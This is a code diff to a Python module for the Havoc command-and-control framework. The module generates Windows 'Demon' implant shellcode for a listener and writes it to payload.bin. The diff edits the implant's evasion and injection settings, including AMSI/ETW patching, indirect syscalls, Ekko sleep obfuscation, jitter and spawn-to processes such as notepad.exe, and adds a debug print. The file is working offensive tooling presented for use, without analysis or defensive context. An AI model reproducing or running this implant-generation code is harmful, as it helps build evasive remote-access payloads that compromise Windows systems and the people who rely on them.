@@ -4,6 +4,7 @@
 from havoc import Demon, RegisterCommand, RegisterModule
 import havoc
 import os
+from base64 import b64decode, b64encode
 
 
 #cwd = os.getcwd()
@@ -12,25 +13,28 @@ shellcode_file_path = cwd + "/payload.bin"
 
 def generate_payload(demon, arch, listener):
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating shellcode")
+	arch = str(arch)
+	listener = str(listener)
 	havoc.GeneratePayload(save_shellcode,
             "Demon",
             listener,
             arch,
             "Windows Shellcode",
             "{ \
-                \"Amsi/Etw Patch\": \"Hardware breakpoints\", \
-                \"Indirect Syscall\": true,  \
+                \"Amsi/Etw Patch\": \"None\", \
+                \"Indirect Syscall\": false,  \
+                \"Sleep Jmp Gadget\": \"None\",  \
                 \"Injection\": { \
                     \"Alloc\": \"Native/Syscall\", \
                     \"Execute\": \"Native/Syscall\", \
-                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\taskhostw.exe\", \
-                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\" \
+                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\", \
+                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \
                 }, \
-                \"Jitter\": \"17\", \
-                \"Proxy Loading\": \"RtlQueueWorkItem\", \
-                \"Sleep\": \"15\", \
+                \"Jitter\": \"15\", \
+                \"Proxy Loading\": \"None (LdrLoadDll)\", \
+                \"Sleep\": \"2\", \
                 \"Sleep Technique\": \"Ekko\", \
-                \"Stack Duplication\": true \
+                \"Stack Duplication\": false \
             }"
         )
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
@@ -68,6 +72,7 @@ def generate(demonID, *params):
 	else:
 		arch = params[1]
 		listener = params[3]
+		demon.ConsoleWrite(demon.CONSOLE_INFO, f"{arch} - {listener}")
 		if listener not in listeners:
 			demon.ConsoleWrite(demon.CONSOLE_ERROR, "Listener is Invalid!")
 			demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
